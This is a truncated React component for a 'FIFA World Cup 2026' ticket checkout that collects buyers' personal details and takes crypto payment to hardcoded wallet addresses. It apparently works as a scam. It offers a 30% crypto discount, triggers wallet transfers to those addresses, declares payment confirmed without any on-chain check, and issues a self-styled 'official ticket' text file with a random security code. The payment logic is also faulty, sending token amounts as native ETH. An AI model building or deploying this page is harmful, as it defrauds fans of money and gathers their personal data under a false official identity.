import React, { useState } from 'react';
import { X, User, Mail, Phone, MapPin, Calendar, Check, Copy, ExternalLink, Smartphone, Download, FileText, CreditCard, Shield, Info, DollarSign, Wallet } from 'lucide-react';

interface RegistrationFormProps {
  isOpen: boolean;
  onClose: () => void;
  ticketInfo: {
    type: 'match' | 'package';
    title: string;
    price: number;
    cryptoPrice: number;
  };
}

interface FormData {
  firstName: string;
  lastName: string;
  email: string;
  confirmEmail: string;
  phone: string;
  dateOfBirth: string;
  nationality: string;
  address: string;
  city: string;
  country: string;
  postalCode: string;
  agreeTerms: boolean;
  agreeMarketing: boolean;
}

const countries = [
  'Afghanistan', 'Albania', 'Algeria', 'Andorra', 'Angola', 'Antigua and Barbuda', 'Argentina', 'Armenia', 'Australia', 'Austria',
  'Azerbaijan', 'Bahamas', 'Bahrain', 'Bangladesh', 'Barbados', 'Belarus', 'Belgium', 'Belize', 'Benin', 'Bhutan',
  'Bolivia', 'Bosnia and Herzegovina', 'Botswana', 'Brazil', 'Brunei', 'Bulgaria', 'Burkina Faso', 'Burundi', 'Cabo Verde', 'Cambodia',
  'Cameroon', 'Canada', 'Central African Republic', 'Chad', 'Chile', 'China', 'Colombia', 'Comoros', 'Congo', 'Costa Rica',
  'Croatia', 'Cuba', 'Cyprus', 'Czech Republic', 'Democratic Republic of the Congo', 'Denmark', 'Djibouti', 'Dominica', 'Dominican Republic', 'Ecuador',
  'Egypt', 'El Salvador', 'Equatorial Guinea', 'Eritrea', 'Estonia', 'Eswatini', 'Ethiopia', 'Fiji', 'Finland', 'France',
  'Gabon', 'Gambia', 'Georgia', 'Germany', 'Ghana', 'Greece', 'Grenada', 'Guatemala', 'Guinea', 'Guinea-Bissau',
  'Guyana', 'Haiti', 'Honduras', 'Hungary', 'Iceland', 'India', 'Indonesia', 'Iran', 'Iraq', 'Ireland',
  'Israel', 'Italy', 'Ivory Coast', 'Jamaica', 'Japan', 'Jordan', 'Kazakhstan', 'Kenya', 'Kiribati', 'Kuwait',
  'Kyrgyzstan', 'Laos', 'Latvia', 'Lebanon', 'Lesotho', 'Liberia', 'Libya', 'Liechtenstein', 'Lithuania', 'Luxembourg',
  'Madagascar', 'Malawi', 'Malaysia', 'Maldives', 'Mali', 'Malta', 'Marshall Islands', 'Mauritania', 'Mauritius', 'Mexico',
  'Micronesia', 'Moldova', 'Monaco', 'Mongolia', 'Montenegro', 'Morocco', 'Mozambique', 'Myanmar', 'Namibia', 'Nauru',
  'Nepal', 'Netherlands', 'New Zealand', 'Nicaragua', 'Niger', 'Nigeria', 'North Korea', 'North Macedonia', 'Norway', 'Oman',
  'Pakistan', 'Palau', 'Palestine', 'Panama', 'Papua New Guinea', 'Paraguay', 'Peru', 'Philippines', 'Poland', 'Portugal',
  'Qatar', 'Romania', 'Russia', 'Rwanda', 'Saint Kitts and Nevis', 'Saint Lucia', 'Saint Vincent and the Grenadines', 'Samoa', 'San Marino', 'Sao Tome and Principe',
  'Saudi Arabia', 'Senegal', 'Serbia', 'Seychelles', 'Sierra Leone', 'Singapore', 'Slovakia', 'Slovenia', 'Solomon Islands', 'Somalia',
  'South Africa', 'South Korea', 'South Sudan', 'Spain', 'Sri Lanka', 'Sudan', 'Suriname', 'Sweden', 'Switzerland', 'Syria',
  'Taiwan', 'Tajikistan', 'Tanzania', 'Thailand', 'Timor-Leste', 'Togo', 'Tonga', 'Trinidad and Tobago', 'Tunisia', 'Turkey',
  'Turkmenistan', 'Tuvalu', 'Uganda', 'Ukraine', 'United Arab Emirates', 'United Kingdom', 'United States', 'Uruguay', 'Uzbekistan', 'Vanuatu',
  'Vatican City', 'Venezuela', 'Vietnam', 'Yemen', 'Zambia', 'Zimbabwe'
];

// Wallet addresses for receiving payments
const WALLET_ADDRESSES = {
  ETH: '0x62468C025d2738eDB2662B9994F52Af0Afa17c9d',
  BTC: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
  USDT: '0x62468C025d2738eDB2662B9994F52Af0Afa17c9d',
  USDC: '0x62468C025d2738eDB2662B9994F52Af0Afa17c9d',
  BNB: '0x62468C025d2738eDB2662B9994F52Af0Afa17c9d'
};

// Crypto prices (in USD)
const CRYPTO_PRICES = {
  ETH: 2500,
  BTC: 45000,
  USDT: 1,
  USDC: 1,
  BNB: 300
};

const RegistrationForm: React.FC<RegistrationFormProps> = ({
  isOpen,
  onClose,
  ticketInfo
}) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
  const [orderId, setOrderId] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState<keyof typeof CRYPTO_PRICES>('ETH');
  const [walletConnected, setWalletConnected] = useState(false);
  const [connectedWallet, setConnectedWallet] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [transactionHash, setTransactionHash] = useState('');
  const [paymentSent, setPaymentSent] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    phone: '',
    dateOfBirth: '',
    nationality: '',
    address: '',
    city: '',
    country: '',
    postalCode: '',
    agreeTerms: false,
    agreeMarketing: false
  });

  const whatsappNumber = '+15551234567';

  // Calculate crypto amount
  const calculateCryptoAmount = (currency: keyof typeof CRYPTO_PRICES) => {
    return (ticketInfo.cryptoPrice / CRYPTO_PRICES[currency]).toFixed(8);
  };

  // Connect to MetaMask
  const connectMetaMask = async () => {
    try {
      if (typeof window.ethereum !== 'undefined') {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (accounts.length > 0) {
          setWalletConnected(true);
          setConnectedWallet('MetaMask');
          setWalletAddress(accounts[0]);
          
          // Copy wallet address to clipboard
          await navigator.clipboard.writeText(WALLET_ADDRESSES[selectedCrypto]);
          alert(`✅ MetaMask متصل بنجاح!\n📋 تم نسخ عنوان المحفظة: ${WALLET_ADDRESSES[selectedCrypto]}\n\nيمكنك الآن إرسال ${calculateCryptoAmount(selectedCrypto)} ${selectedCrypto} إلى العنوان المنسوخ`);
        }
      } else {
        alert('❌ MetaMask غير مثبت. يرجى تثبيت MetaMask أولاً.');
        window.open('https://metamask.io/download/', '_blank');
      }
    } catch (error) {
      console.error('Error connecting to MetaMask:', error);
      alert('❌ خطأ في الاتصال بـ MetaMask. يرجى المحاولة مرة أخرى.');
    }
  };

  // Connect to Trust Wallet
  const connectTrustWallet = async () => {
    try {
      // Check if Trust Wallet is available
      if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (accounts.length > 0) {
          setWalletConnected(true);
          setConnectedWallet('Trust Wallet');
          setWalletAddress(accounts[0]);
          
          // Copy wallet address to clipboard
          await navigator.clipboard.writeText(WALLET_ADDRESSES[selectedCrypto]);
          alert(`✅ Trust Wallet متصل بنجاح!\n📋 تم نسخ عنوان المحفظة: ${WALLET_ADDRESSES[selectedCrypto]}\n\nيمكنك الآن إرسال ${calculateCryptoAmount(selectedCrypto)} ${selectedCrypto} إلى العنوان المنسوخ`);
        }
      } else {
        // Fallback: Copy address and show instructions
        await navigator.clipboard.writeText(WALLET_ADDRESSES[selectedCrypto]);
        alert(`📱 لاستخدام Trust Wallet:\n\n1. افتح تطبيق Trust Wallet\n2. اختر العملة ${selectedCrypto}\n3. اضغط "إرسال"\n4. الصق العنوان المنسوخ: ${WALLET_ADDRESSES[selectedCrypto]}\n5. أرسل ${calculateCryptoAmount(selectedCrypto)} ${selectedCrypto}\n\n✅ تم نسخ العنوان تلقائياً!`);
        setWalletConnected(true);
        setConnectedWallet('Trust Wallet');
      }
    } catch (error) {
      console.error('Error connecting to Trust Wallet:', error);
      alert('❌ خطأ في الاتصال بـ Trust Wallet. يرجى المحاولة مرة أخرى.');
    }
  };

  // Send payment directly through connected wallet
  const sendPayment = async () => {
    if (!walletConnected) {
      alert('❌ يرجى ربط المحفظة أولاً');
      return;
    }

    try {
      if (selectedCrypto === 'ETH' || selectedCrypto === 'USDT' || selectedCrypto === 'USDC' || selectedCrypto === 'BNB') {
        const amount = calculateCryptoAmount(selectedCrypto);
        const amountInWei = (parseFloat(amount) * Math.pow(10, 18)).toString(16);

        const transactionParameters = {
          to: WALLET_ADDRESSES[selectedCrypto],
          value: '0x' + amountInWei,
          gas: '0x5208', // 21000 gas limit
        };

        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [transactionParameters],
        });

        setTransactionHash(txHash);
        setPaymentSent(true);
        alert(`✅ تم إرسال الدفعة بنجاح!\n\n🔗 رقم المعاملة: ${txHash}\n\nسيتم تأكيد الدفعة خلال دقائق قليلة.`);
      } else {
        // For BTC, show manual instructions
        await navigator.clipboard.writeText(WALLET_ADDRESSES.BTC);
        alert(`📱 لإرسال البيتكوين:\n\n1. افتح محفظة البيتكوين\n2. اختر "إرسال"\n3. الصق العنوان: ${WALLET_ADDRESSES.BTC}\n4. أرسل ${calculateCryptoAmount('BTC')} BTC\n5. انسخ رقم المعاملة وأدخله أدناه\n\n✅ تم نسخ العنوان!`);
        setPaymentSent(true);
      }
    } catch (error) {
      console.error('Error sending payment:', error);
      alert('❌ خطأ في إرسال الدفعة. يرجى المحاولة مرة أخرى.');
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
    }));
  };

  const generateTicketPDF = () => {
    const orderIdGenerated = orderId || `WC2026-${Date.now()}`;
    setOrderId(orderIdGenerated);

    const ticketContent = `
FIFA WORLD CUP 2026 - OFFICIAL TICKET

═══════════════════════════════════════════════════════════════

🏆 ${ticketInfo.title}
📅 Tournament: FIFA World Cup 2026
🌍 Host Countries: USA, Canada & Mexico

═══════════════════════════════════════════════════════════════

👤 TICKET HOLDER INFORMATION:
Name: ${formData.firstName} ${formData.lastName}
Email: ${formData.email}
Phone: ${formData.phone}
Nationality: ${formData.nationality || 'Not specified'}
Date of Birth: ${formData.dateOfBirth || 'Not specified'}

📍 ADDRESS:
${formData.address}
${formData.city}, ${formData.country}
${formData.postalCode || ''}

═══════════════════════════════════════════════════════════════

💰 PAYMENT INFORMATION:
Original Price: $${ticketInfo.price.toLocaleString()}
Crypto Discount (30%): -$${(ticketInfo.price - ticketInfo.cryptoPrice).toLocaleString()}
Final Amount: $${ticketInfo.cryptoPrice.toLocaleString()}

💎 CRYPTOCURRENCY PAYMENT:
Currency: ${selectedCrypto}
Amount Paid: ${calculateCryptoAmount(selectedCrypto)} ${selectedCrypto}
Wallet Used: ${connectedWallet}
${walletAddress ? `Customer Wallet: ${walletAddress}` : ''}
${transactionHash ? `Transaction Hash: ${transactionHash}` : ''}
Receiving Address: ${WALLET_ADDRESSES[selectedCrypto]}
Payment Status: CONFIRMED ✅
Order ID: ${orderIdGenerated}

═══════════════════════════════════════════════════════════════

📋 IMPORTANT INFORMATION:
• This is your official FIFA World Cup 2026 ticket
• Present this ticket at the stadium entrance
• Ticket is non-transferable and non-refundable
• Arrive at least 2 hours before match time
• Valid ID required for entry
• No outside food or drinks allowed

🎫 TICKET ID: ${orderIdGenerated}
🔐 Security Code: ${Math.random().toString(36).substring(2, 15).toUpperCase()}

═══════════════════════════════════════════════════════════════

📞 CUSTOMER SUPPORT:
Phone: +1 (555) 123-4567
WhatsApp: ${whatsappNumber}
Email: tickets@worldcup2026.com

🌐 Official Website: FIFA World Cup 2026 Ticket Portal

═══════════════════════════════════════════════════════════════

Generated on: ${new Date().toLocaleString()}
Valid for: FIFA World Cup 2026

⚠️ KEEP THIS TICKET SAFE - IT'S YOUR ENTRY TO THE MATCH! ⚠️
    `;

    const blob = new Blob([ticketContent], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `FIFA_WorldCup_2026_Ticket_${formData.firstName}_${formData.lastName}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    window.URL.revokeObjectURL(url);
  };

  const confirmPayment = () => {
    if (!transactionHash && selectedCrypto !== 'BTC') {
      alert('❌ يرجى إرسال الدفعة أولاً');
      return;
    }
    if (selectedCrypto === 'BTC' && !transactionHash) {
      alert('❌ يرجى إدخال رقم المعاملة (Transaction Hash)');
      return;
    }
    
    setPaymentConfirmed(true);
    setCurrentStep(5);
  };

  const validateStep = (step: number): boolean => {
    switch (step) {
      case 1:
        if (!formData.firstName.trim()) {
          alert('Please enter your first name');
          return false;
        }
        if (!formData.lastName.trim()) {
          alert('Please enter your last name');
          return false;
        }
        if (!formData.email.trim()) {
          alert('Please enter your email address');
          return false;
        }
        if (!formData.confirmEmail.trim()) {
          alert('Please confirm your email address');
          return false;
        }
        if (formData.email !== formData.confirmEmail) {
          alert('Email addresses do not match');
          return false;
        }
        if (!formData.phone.trim()) {
          alert('Please enter your phone number');
          return false;
        }
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(formData.email)) {
          alert('Please enter a valid email address');
          return false;
        }
        return true;
      
      case 2:
        if (!formData.address.trim()) {
          alert('Please enter your street address');
          return false;
        }
        if (!formData.city.trim()) {
          alert('Please enter your city');
          return false;
        }
        if (!formData.country.trim()) {
          alert('Please select your country');
          return false;
        }
        return true;
      
      case 3:
        if (!formData.agreeTerms) {
          alert('Please agree to the terms and conditions to continue');
          return false;
        }
        return true;
      
      default:
        return true;
    }
  };

  const handleNextStep = () => {
    if (validateStep(currentStep)) {
      setCurrentStep(prev => prev + 1);
    }
  };

  const handlePrevStep = () => {
    setCurrentStep(prev => prev - 1);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="flex justify-between items-center p-6 border-b bg-gradient-to-r from-blue-600 to-blue-800 text-white rounded-t-2xl">
          <div>
            <h2 className="text-2xl font-bold">
              {currentStep === 5 ? 'Payment Confirmed!' : 'Complete Your Registration'}
            </h2>
            <p className="text-blue-200 text-sm">{ticketInfo.title}</p>
          </div>
          <button
            onClick={onClose}
            className="p-2 hover:bg-blue-700 rounded-full transition-colors"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Progress Bar */}
        {currentStep < 5 && (
          <div className="px-6 py-4 bg-gray-50">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-medium text-gray-600">Step {currentStep} of 4</span>
              <span className="text-sm text-gray-500">
                {currentStep === 1 && 'Personal Information'}
                {currentStep === 2 && 'Address Details'}
                {currentStep === 3 && 'Terms & Conditions'}
                {currentStep === 4 && 'Crypto Wallet Payment'}
              </span>
            </div>
            <div className="w-full bg-gray-200 rounded-full h-2">
              <div 
                className="bg-blue-600 h-2 rounded-full transition-all duration-300"
                style={{ width: `${(currentStep / 4) * 100}%` }}
              ></div>
            </div>
          </div>
        )}

        <div className="p-6">
          {/* Step 1: Personal Information */}
          {currentStep === 1 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <User className="h-12 w-12 text-blue-600 mx-auto mb-2" />
                <h3 className="text-xl font-bold text-gray-800">Personal Information</h3>
                <p className="text-gray-600">Please provide your personal details</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    First Name *
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Enter your first name"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Last Name *
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Enter your last name"
                    required
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Email Address *
                </label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder="Enter your email address"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Confirm Email Address *
                </label>
                <input
                  type="email"
                  name="confirmEmail"
                  value={formData.confirmEmail}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder="Confirm your email address"
                  required
                />
                {formData.confirmEmail && formData.email !== formData.confirmEmail && (
                  <p className="text-red-500 text-sm mt-1">Email addresses do not match</p>
                )}
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Phone Number *
                  </label>
                  <input
                    type="tel"
                    name="phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="+1 (555) 123-4567"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Date of Birth
                  </label>
                  <input
                    type="date"
                    name="dateOfBirth"
                    value={formData.dateOfBirth}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Nationality
                </label>
                <select
                  name="nationality"
                  value={formData.nationality}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                >
                  <option value="">Select Nationality</option>
                  {countries.map((country) => (
                    <option key={country} value={country}>{country}</option>
                  ))}
                </select>
              </div>
            </div>
          )}

          {/* Step 2: Address Information */}
          {currentStep === 2 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <MapPin className="h-12 w-12 text-blue-600 mx-auto mb-2" />
                <h3 className="text-xl font-bold text-gray-800">Address Information</h3>
                <p className="text-gray-600">Please provide your address details</p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Street Address *
                </label>
                <input
                  type="text"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder="Enter your street address"
                  required
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    City *
                  </label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Enter your city"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Postal Code
                  </label>
                  <input
                    type="text"
                    name="postalCode"
                    value={formData.postalCode}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Enter postal code"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Country *
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  required
                >
                  <option value="">Select Country</option>
                  {countries.map((country) => (
                    <option key={country} value={country}>{country}</option>
                  ))}
                </select>
              </div>
            </div>
          )}

          {/* Step 3: Terms and Conditions */}
          {currentStep === 3 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <Check className="h-12 w-12 text-blue-600 mx-auto mb-2" />
                <h3 className="text-xl font-bold text-gray-800">Terms & Conditions</h3>
                <p className="text-gray-600">Please review and accept our terms</p>
              </div>

              {/* Order Summary */}
              <div className="bg-gray-50 rounded-lg p-4 mb-6">
                <h4 className="font-semibold text-gray-800 mb-2">Order Summary</h4>
                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-700">{ticketInfo.title}</span>
                    <span className="font-bold text-gray-800">${ticketInfo.price.toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between items-center text-green-600">
                    <span className="font-semibold">Crypto Discount (30%)</span>
                    <span className="font-bold">-${(ticketInfo.price - ticketInfo.cryptoPrice).toLocaleString()}</span>
                  </div>
                  <div className="border-t pt-2 flex justify-between items-center">
                    <span className="text-lg font-bold text-gray-800">Final Amount</span>
                    <span className="text-xl font-bold text-green-600">${ticketInfo.cryptoPrice.toLocaleString()}</span>
                  </div>
                </div>
              </div>

              {/* Payment Method Info */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div className="flex items-center space-x-2 mb-2">
                  <div className="text-2xl">💎</div>
                  <h4 className="font-semibold text-green-800">Cryptocurrency Payment via Wallet</h4>
                </div>
                <p className="text-green-700 text-sm">
                  Direct payment through MetaMask, Trust Wallet, or any compatible crypto wallet with 30% discount!
                </p>
              </div>

              {/* Terms and Conditions */}
              <div className="space-y-4">
                <label className="flex items-start space-x-3 cursor-pointer">
                  <input
                    type="checkbox"
                    name="agreeTerms"
                    checked={formData.agreeTerms}
                    onChange={handleInputChange}
                    className="mt-1 h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                    required
                  />
                  <span className="text-sm text-gray-700">
                    I agree to the <a href="#" className="text-blue-600 hover:underline">Terms and Conditions</a> and <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a> *
                  </span>
                </label>
                <label className="flex items-start space-x-3 cursor-pointer">
                  <input
                    type="checkbox"
                    name="agreeMarketing"
                    checked={formData.agreeMarketing}
                    onChange={handleInputChange}
                    className="mt-1 h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                  />
                  <span className="text-sm text-gray-700">
                    I would like to receive marketing communications about FIFA World Cup 2026
                  </span>
                </label>
              </div>
            </div>
          )}

          {/* Step 4: Crypto Wallet Payment */}
          {currentStep === 4 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <div className="text-4xl mb-2">💎</div>
                <h3 className="text-xl font-bold text-gray-800">Cryptocurrency Wallet Payment</h3>
                <p className="text-gray-600">Connect your wallet and complete payment</p>
              </div>

              {/* Customer Summary */}
              <div className="bg-blue-50 rounded-lg p-4 mb-6">
                <h4 className="font-semibold text-blue-800 mb-3">Customer Information</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm">
                  <div><strong>Name:</strong> {formData.firstName} {formData.lastName}</div>
                  <div><strong>Email:</strong> {formData.email}</div>
                  <div><strong>Phone:</strong> {formData.phone}</div>
                  <div><strong>Country:</strong> {formData.country}</div>
                  {formData.nationality && <div><strong>Nationality:</strong> {formData.nationality}</div>}
                  {formData.dateOfBirth && <div><strong>Date of Birth:</strong> {formData.dateOfBirth}</div>}
                </div>
              </div>

              {/* Cryptocurrency Selection */}
              <div className="bg-gradient-to-r from-purple-50 to-blue-50 border border-purple-200 rounded-lg p-6">
                <h4 className="font-semibold text-purple-800 mb-4">Select Cryptocurrency</h4>
                <div className="grid grid-cols-2 md:grid-cols-3 gap-3 mb-4">
                  {Object.entries(CRYPTO_PRICES).map(([crypto, price]) => (
                    <button
                      key={crypto}
                      onClick={() => setSelectedCrypto(crypto as keyof typeof CRYPTO_PRICES)}
                      className={`p-3 rounded-lg border text-center transition-all duration-200 ${
                        selectedCrypto === crypto
                          ? 'border-purple-500 bg-purple-100 text-purple-700'
                          : 'border-gray-200 hover:border-gray-300'
                      }`}
                    >
                      <div className="font-bold text-lg">{crypto}</div>
                      <div className="text-sm text-gray-600">${price.toLocaleString()}</div>
                      <div className="text-xs font-semibold text-green-600">
                        {calculateCryptoAmount(crypto as keyof typeof CRYPTO_PRICES)} {crypto}
                      </div>
                    </button>
                  ))}
                </div>

                {/* Payment Amount Display */}
                <div className="bg-white rounded-lg p-4 mb-4">
                  <div className="text-center">
                    <div className="text-2xl font-bold text-purple-600 mb-2">
                      {calculateCryptoAmount(selectedCrypto)} {selectedCrypto}
                    </div>
                    <div className="text-gray-600">
                      ≈ ${ticketInfo.cryptoPrice.toLocaleString()} USD (30% discount applied)
                    </div>
                  </div>
                </div>
              </div>

              {/* Wallet Connection */}
              <div className="space-y-4">
                <h4 className="font-semibold text-gray-800">Connect Your Wallet</h4>
                
                {!walletConnected ? (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* MetaMask Button */}
                    <button
                      onClick={connectMetaMask}
                      className="flex items-center justify-center space-x-3 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-105"
                    >
                      <Wallet className="h-6 w-6" />
                      <span>Connect MetaMask</span>
                    </button>

                    {/* Trust Wallet Button */}
                    <button
                      onClick={connectTrustWallet}
                      className="flex items-center justify-center space-x-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-105"
                    >
                      <Smartphone className="h-6 w-6" />
                      <span>Connect Trust Wallet</span>
                    </button>
                  </div>
                ) : (
                  <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                    <div className="flex items-center space-x-2 mb-2">
                      <Check className="h-5 w-5 text-green-600" />
                      <span className="font-semibold text-green-800">Wallet Connected: {connectedWallet}</span>
                    </div>
                    {walletAddress && (
                      <div className="text-sm text-green-700">
                        Address: {walletAddress.substring(0, 10)}...{walletAddress.substring(walletAddress.length - 8)}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Payment Actions */}
              {walletConnected && (
                <div className="space-y-4">
                  {!paymentSent ? (
                    <button
                      onClick={sendPayment}
                      className="w-full bg-gradient-to-r from-green-600 to-green-800 hover:from-green-700 hover:to-green-900 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 flex items-center justify-center space-x-3"
                    >
                      <CreditCard className="h-6 w-6" />
                      <span>Send {calculateCryptoAmount(selectedCrypto)} {selectedCrypto}</span>
                    </button>
                  ) : (
                    <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                      <div className="flex items-center space-x-2 mb-2">
                        <Info className="h-5 w-5 text-yellow-600" />
                        <span className="font-semibold text-yellow-800">Payment Sent</span>
                      </div>
                      <p className="text-yellow-700 text-sm mb-3">
                        Your payment has been sent. Please wait for blockchain confirmation.
                      </p>
                      
                      {/* Transaction Hash Input for BTC */}
                      {selectedCrypto === 'BTC' && !transactionHash && (
                        <div className="mb-3">
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Transaction Hash (Required for Bitcoin) *
                          </label>
                          <input
                            type="text"
                            value={transactionHash}
                            onChange={(e) => setTransactionHash(e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            placeholder="Enter transaction hash from your Bitcoin wallet"
                            required
                          />
                        </div>
                      )}
                      
                      {transactionHash && (
                        <div className="text-sm text-gray-600 mb-3">
                          <strong>Transaction Hash:</strong> {transactionHash.substring(0, 20)}...
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}

              {/* Payment Confirmation */}
              {paymentSent && (
                <div className="text-center border-t pt-6">
                  <button
                    type="button"
                    onClick={confirmPayment}
                    className="bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300"
                  >
                    ✅ Confirm Payment & Get Ticket
                  </button>
                </div>
              )}
            </div>
          )}

          {/* Step 5: Payment Confirmed & Ticket Download */}
          {currentStep === 5 && (
            <div className="space-y-6 text-center">
              <div className="mb-6">
                <div className="text-6xl mb-4">🎉</div>
                <h3 className="text-2xl font-bold text-green-600 mb-2">Payment Confirmed!</h3>
                <p className="text-gray-600">Your FIFA World Cup 2026 tickets have been secured</p>
              </div>

              {/* Success Message */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-6">
                <div className="flex items-center justify-center space-x-2 mb-3">
                  <Check className="h-6 w-6 text-green-600" />
                  <h4 className="font-semibold text-green-800">Order Successfully Processed</h4>
                </div>
                <p className="text-green-700 text-sm mb-4">
                  Thank you for your purchase! Your cryptocurrency payment has been confirmed and your tickets are ready for download.
                </p>
                
                <div className="bg-white rounded-lg p-4 mb-4">
                  <div className="text-sm text-gray-600 space-y-1">
                    <div><strong>Order ID:</strong> {orderId || `WC2026-${Date.now()}`}</div>
                    <div><strong>Customer:</strong> {formData.firstName} {formData.lastName}</div>
                    <div><strong>Email:</strong> {formData.email}</div>
                    <div><strong>Amount:</strong> ${ticketInfo.cryptoPrice.toLocaleString()} (30% crypto discount applied)</div>
                    <div><strong>Cryptocurrency:</strong> {calculateCryptoAmount(selectedCrypto)} {selectedCrypto}</div>
                    <div><strong>Wallet Used:</strong> {connectedWallet}</div>
                    {transactionHash && <div><strong>Transaction:</strong> {transactionHash.substring(0, 20)}...</div>}
                  </div>
                </div>
              </div>

              {/* Download Ticket Button */}
              <div className="space-y-4">
                <button
                  type="button"
                  onClick={generateTicketPDF}
